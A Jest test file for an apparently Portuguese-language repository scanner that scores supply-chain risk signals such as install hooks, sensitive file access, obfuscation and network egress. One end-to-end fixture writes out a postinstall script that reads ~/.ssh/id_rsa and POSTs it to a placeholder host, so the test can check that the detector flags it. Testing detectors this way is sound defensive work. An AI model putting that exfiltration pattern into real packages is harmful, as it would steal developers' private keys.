import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runAnalysis } from '../src/analysis';
import { DEFAULT_WEIGHTS, loadWeights, parseWeights, scoreEvidence, shouldAlert } from '../src/engine';
import { Evidence, Family, WeightsConfig } from '../src/types';
import { createFsReader } from './helpers/fsReader';

let seq = 0;
function ev(familia: Family, arquivo: string, extra: Partial<Evidence> = {}): Evidence {
  seq++;
  return {
    id: `r${seq}@${arquivo}:${seq}:1`,
    familia,
    arquivo,
    linha: seq,
    coluna: 1,
    trecho: 'x',
    explicacao: 'y',
    ...extra,
  };
}

describe('pontuação', () => {
  it('repositório sem evidências: 0, BAIXO, silêncio', () => {
    const r = scoreEvidence([]);
    expect(r).toMatchObject({ pontuacao: 0, nivel: 'BAIXO' });
    expect(shouldAlert(r)).toBe(false);
    expect(r.justificativa).toBe('Nenhum sinal de risco encontrado.');
  });

  it('abaixo do limiar fica em silêncio (build com prepare + spawnSync = 45)', () => {
    const r = scoreEvidence([ev('EXEC_AUTOMATICA', 'package.json'), ev('EXEC_SISTEMA', 'scripts/build.js')]);
    expect(r.pontuacao).toBe(45);
    expect(r.nivel).toBe('BAIXO');
    expect(shouldAlert(r)).toBe(false);
  });

  it('cada família conta uma vez no repositório, não por ocorrência', () => {
    const many = Array.from({ length: 10 }, (_, i) => ev('EXEC_SISTEMA', `scripts/s${i}.js`));
    expect(scoreEvidence(many).pontuacao).toBe(20);
  });

  it('ACESSO_SENSIVEL + SAIDA_REDE no mesmo arquivo multiplica por 1.5', () => {
    const r = scoreEvidence([ev('ACESSO_SENSIVEL', 'steal.js'), ev('SAIDA_REDE', 'steal.js')]);
    expect(r.pontuacao).toBe(90);
    expect(r.nivel).toBe('MEDIO');
    expect(r.detalhamento).toMatchObject({ somaBase: 60, multiplicador: 1.5, arquivoCorrelacao: 'steal.js' });
    expect(r.justificativa).toContain('steal.js');
  });

  it('as mesmas famílias em arquivos diferentes não multiplicam', () => {
    const r = scoreEvidence([ev('ACESSO_SENSIVEL', 'test/env.test.js'), ev('SAIDA_REDE', 'src/api.js')]);
    expect(r.pontuacao).toBe(60);
    expect(r.detalhamento.multiplicador).toBe(1);
    expect(r.detalhamento.arquivoCorrelacao).toBeUndefined();
  });

  it('cenário postinstall malicioso: (25+20+35+25) × 1.5 = 157.5, ALTO', () => {
    const r = scoreEvidence([
      ev('EXEC_AUTOMATICA', 'package.json'),
      ev('EXEC_SISTEMA', 'scripts/setup.js'),
      ev('ACESSO_SENSIVEL', 'scripts/setup.js'),
      ev('SAIDA_REDE', 'scripts/setup.js'),
    ]);
    expect(r.pontuacao).toBe(157.5);
    expect(r.nivel).toBe('ALTO');
  });

  it('tríade no mesmo arquivo: × 2.0 e ALTO independentemente do total', () => {
    const low: WeightsConfig = {
      ...DEFAULT_WEIGHTS,
      pesos: { ...DEFAULT_WEIGHTS.pesos, ACESSO_SENSIVEL: 1, OFUSCACAO: 1, SAIDA_REDE: 1 },
    };
    const r = scoreEvidence(
      [ev('ACESSO_SENSIVEL', 'a.js'), ev('OFUSCACAO', 'a.js'), ev('SAIDA_REDE', 'a.js')],
      low,
    );
    expect(r.pontuacao).toBe(6);
    expect(r.nivel).toBe('ALTO');
    expect(r.detalhamento).toMatchObject({ multiplicador: 2, nivelForcadoPor: 'triade' });
  });

  it('tríade vence a correlação simples de outro arquivo', () => {
    const r = scoreEvidence([
      ev('ACESSO_SENSIVEL', 'a.js'),
      ev('SAIDA_REDE', 'a.js'),
      ev('ACESSO_SENSIVEL', 'z.js'),
      ev('OFUSCACAO', 'z.js'),
      ev('SAIDA_REDE', 'z.js'),
    ]);
    expect(r.detalhamento).toMatchObject({ multiplicador: 2, arquivoCorrelacao: 'z.js' });
  });

  it('exceção: evidência fora da contenção garante no mínimo MEDIO', () => {
    const r = scoreEvidence([ev('EXEC_AUTOMATICA', '.vscode/tasks.json', { foraDaContencao: true })]);
    expect(r.pontuacao).toBe(25);
    expect(r.nivel).toBe('MEDIO');
    expect(r.detalhamento.nivelForcadoPor).toBe('fora-da-contencao');
    expect(shouldAlert(r)).toBe(true);
    expect(r.justificativa).toContain('.vscode/tasks.json');
  });

  it('a exceção não rebaixa um ALTO', () => {
    const r = scoreEvidence([
      ev('EXEC_AUTOMATICA', '.vscode/tasks.json', { foraDaContencao: true }),
      ev('ACESSO_SENSIVEL', 'x.js'),
      ev('SAIDA_REDE', 'x.js'),
    ]);
    expect(r.nivel).toBe('ALTO');
    expect(r.detalhamento.nivelForcadoPor).toBeUndefined();
  });

  it('ordena: fora da contenção primeiro, depois arquivo e linha', () => {
    const r = scoreEvidence([
      ev('EXEC_SISTEMA', 'b.js', { linha: 9 }),
      ev('EXEC_SISTEMA', 'a.js', { linha: 5 }),
      ev('EXEC_AUTOMATICA', 'z.json', { linha: 1, foraDaContencao: true }),
      ev('EXEC_SISTEMA', 'a.js', { linha: 2 }),
    ]);
    expect(r.evidencias.map((e) => `${e.arquivo}:${e.linha}`)).toEqual(['z.json:1', 'a.js:2', 'a.js:5', 'b.js:9']);
  });

  it('análise incompleta aparece no detalhamento e na justificativa', () => {
    const r = scoreEvidence([ev('EXEC_SISTEMA', 'a.js')], DEFAULT_WEIGHTS, { analiseIncompleta: true });
    expect(r.detalhamento.analiseIncompleta).toBe(true);
    expect(r.justificativa).toContain('pode haver mais sinais');
  });
});

describe('pesos', () => {
  it('config/weights.json do projeto é válido e igual aos padrões', async () => {
    const loaded = await loadWeights(path.join(__dirname, '..', 'config', 'weights.json'));
    expect(loaded.aviso).toBeUndefined();
    expect(loaded.config).toEqual(DEFAULT_WEIGHTS);
  });

  it('recusa pesos ausentes, negativos ou multiplicador menor que 1', () => {
    const base = JSON.parse(JSON.stringify(DEFAULT_WEIGHTS)) as Record<string, unknown>;
    expect(() => parseWeights({ ...base, pesos: { ...DEFAULT_WEIGHTS.pesos, OFUSCACAO: -1 } })).toThrow('OFUSCACAO');
    expect(() => parseWeights({ ...base, pesos: { EXEC_SISTEMA: 1 } })).toThrow('peso inválido');
    expect(() => parseWeights({ ...base, multiplicadorTriade: 0.5 })).toThrow('multiplicadorTriade');
    expect(() => parseWeights({ ...base, limiarAlto: 10 })).toThrow('limiarAlto');
  });

  it('arquivo inválido cai nos padrões com aviso, sem derrubar a extensão', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'repoguard-weights-'));
    const file = path.join(dir, 'weights.json');
    fs.writeFileSync(file, '{ quebrado');
    const loaded = await loadWeights(file);
    expect(loaded.config).toEqual(DEFAULT_WEIGHTS);
    expect(loaded.aviso).toContain('valores padrão');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('pesos calibrados mudam o resultado sem recompilar', () => {
    const custom = parseWeights({ ...DEFAULT_WEIGHTS, pesos: { ...DEFAULT_WEIGHTS.pesos, EXEC_SISTEMA: 60 } });
    expect(scoreEvidence([ev('EXEC_SISTEMA', 'a.js')], custom).nivel).toBe('MEDIO');
  });
});

describe('runAnalysis (ponta a ponta)', () => {
  const dirs: string[] = [];
  afterAll(() => dirs.forEach((d) => fs.rmSync(d, { recursive: true, force: true })));

  function repo(files: Record<string, string>): string {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'repoguard-run-'));
    dirs.push(root);
    for (const [rel, content] of Object.entries(files)) {
      const abs = path.join(root, ...rel.split('/'));
      fs.mkdirSync(path.dirname(abs), { recursive: true });
      fs.writeFileSync(abs, content);
    }
    return root;
  }

  it('repositório malicioso: postinstall que lê ~/.ssh e envia pela rede', async () => {
    const root = repo({
      'package.json': JSON.stringify({ scripts: { postinstall: 'node scripts/setup.js' } }, null, 2),
      'scripts/setup.js': [
        "const fs = require('fs');",
        "const os = require('os');",
        "const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');",
        "fetch('https://coleta.invalid/k', { method: 'POST', body: key });",
      ].join('\n'),
    });
    const run = await runAnalysis(createFsReader(root), DEFAULT_WEIGHTS);
    expect(run.resultado.nivel).toBe('ALTO');
    expect(run.resultado.detalhamento.arquivoCorrelacao).toBe('scripts/setup.js');
    expect(run.resultado.detalhamento.analiseIncompleta).toBe(false);
  });

  it('repositório benigno fica em silêncio', async () => {
    const root = repo({
      'package.json': JSON.stringify({ scripts: { build: 'node build.js', test: 'jest' } }, null, 2),
      'build.js': "const p = require('path'); console.log(p.join(__dirname, 'dist'), process.env.NODE_ENV);",
    });
    const run = await runAnalysis(createFsReader(root), DEFAULT_WEIGHTS);
    expect(run.resultado.pontuacao).toBe(0);
    expect(shouldAlert(run.resultado)).toBe(false);
  });

  it('prazo esgotado marca a análise como incompleta', async () => {
    const root = repo({ 'package.json': '{}', 'Makefile': 'all:\n\techo\n' });
    const fast = createFsReader(root);
    // Leitor lento de propósito: cada stat leva 30 ms, o prazo é 10 ms.
    const slow = {
      stat: async (p: string) => {
        await new Promise((r) => setTimeout(r, 30));
        return fast.stat(p);
      },
      read: fast.read,
    };
    const run = await runAnalysis(slow, DEFAULT_WEIGHTS, 10);
    expect(run.resultado.detalhamento.analiseIncompleta).toBe(true);
    expect(run.resultado.justificativa).toContain('dentro do prazo');
  });
});
